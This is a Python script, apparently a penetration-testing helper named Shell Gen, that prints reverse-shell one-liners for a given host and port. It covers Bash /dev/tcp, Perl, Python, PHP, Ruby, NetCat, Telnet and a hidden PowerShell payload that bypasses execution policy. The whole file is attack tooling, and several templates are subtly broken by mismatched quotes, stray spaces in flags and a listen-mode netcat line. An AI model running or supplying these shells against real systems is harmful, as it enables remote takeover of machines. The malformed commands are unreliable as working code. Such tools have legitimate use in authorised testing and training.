#!/usr/bin/python3

# import needed modules
import re, sys, ipaddress

# print banner if not enough arguments
if len(sys.argv) < 2:
    print(
        """
    Shell Gen - Reverse Shell Generator\n\tVersion: 1.1\n\tAuthor: @Cydef_Unicorn
        
    Shell Gen generates reverse shells with the following methods:
        
     * PHP
     * Bash
     * Perl
     * Ruby
     * Python
     * NetCat
     * Telnet
     * PowerShell
        
    Usage: Shell_Gen.py <LHOST> <LPORT>
        """)
    sys.exit()

# Validate input format and grab Local IP and Port for Reverse Shell
def input_check(LHOST, LPORT):
    LHOST = ipaddress.ip_address(LHOST)
    LPORT = LPORT
    return [LHOST, LPORT]

# run functions to generate reverse shell commands
def generate_shells(ipp):
    LHOST = ipp[0]
    LPORT = ipp[1]

    #Bash Shell
    print("\n[+] BASH SHELL")
    print("--------------")
    print("bash -i >& /dev/tcp/"+str(LHOST)+"/"+LPORT+" 0>&1")
    print("\nOR\n")
    print("0<&196;exec 196<>/dev/tcp/"+str(LHOST)+"/"+LPORT+"; sh <&196 >&196 2>&196")

    #Perl
    print("\n\n[+] PERL SHELL")
    print("--------------")
    perl_rev = "perl -e 'use Socket;$i='ADDRESS';$p="+LPORT+";socket(S,PF_INET," \
               "SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in" \
               "($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');" \
               "open(STDERR,'>&S';exec('/bin/sh -i');};'"

    cmd = re.sub('ADDRESS', str(LHOST), perl_rev)
    print(cmd)

    # Perl Windows
    print("\n\n[+] PERL SHELL (WINDOWS)")
    print("------------------------")
    perl_win_rev = "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,'ADDRESS:"+LPORT+"')" \
                   ";STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

    cmd = re.sub('ADDRESS', str(LHOST), perl_win_rev)
    print(cmd)

    # Python
    print("\n\n[+] PYTHON SHELL")
    print("----------------")
    py_rev = "python -c 'import socket,subprocess,os;s=socket.socket" \
          "(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ADDRESS'" \
          ","+LPORT+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)" \
          ";""os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'"

    cmd = re.sub('ADDRESS',str(LHOST), py_rev)
    print(cmd)

    # PHP
    print("\n\n[+] PHP SHELL")
    print("-------------")
    php_rev = "php - r '$sock=fsockopen('ADDRESS',"+LPORT+");exec('/bin/sh -i <&3 >&3 2>&3');'"

    cmd = re.sub('ADDRESS',str(LHOST), php_rev)
    print(cmd)

    # Ruby
    print("\n\n[+] RUBY SHELL")
    print("--------------")
    ruby_rev = "ruby -rsocket -e'f=TCPSocket.open('ADDRESS',"+LPORT+").to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'"

    cmd = re.sub('ADDRESS', str(LHOST), ruby_rev)
    print(cmd)

    # Ruby Windows
    print("\n\n[+] RUBY SHELL (WINDOWS)")
    print("------------------------")
    ruby_win_rev = "ruby - rsocket - e 'c=TCPSocket.new('ADDRESS',"+LPORT+");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"

    cmd = re.sub('ADDRESS', str(LHOST), ruby_win_rev)
    print(cmd)

    # NetCat
    print("\n\n[+] NETCAT SHELL")
    print("----------------")
    nc_rev = "nc -nvlp "'ADDRESS'" "+LPORT+" -e /bin/sh"

    cmd = re.sub('ADDRESS', str(LHOST), nc_rev)
    print(cmd)

    # Telnet
    print("\n\n[+] TELNET SHELL")
    print("----------------")
    telnet_rev = 'rm -f /tmp/p; mknod /tmp/p p && telnet ADDRESS '+LPORT+' 0/tmp/p'

    cmd = re.sub('ADDRESS', str(LHOST), telnet_rev)
    print(cmd)

    # PowerShell
    print("\n\n[+] POWERSHELL SHELL")
    print("--------------------")
    power_rev = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object' \
                ' System.Net.Sockets.TCPClient("ADDRESS",'+LPORT+');$stream = $client.' \
                'GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read' \
                '($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName ' \
                'System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = ' \
                '(iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + ' \
                '(pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)' \
                ';$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

    cmd = re.sub("ADDRESS", str(LHOST), power_rev)
    print(cmd)

generate_shells(input_check(sys.argv[1], sys.argv[2]))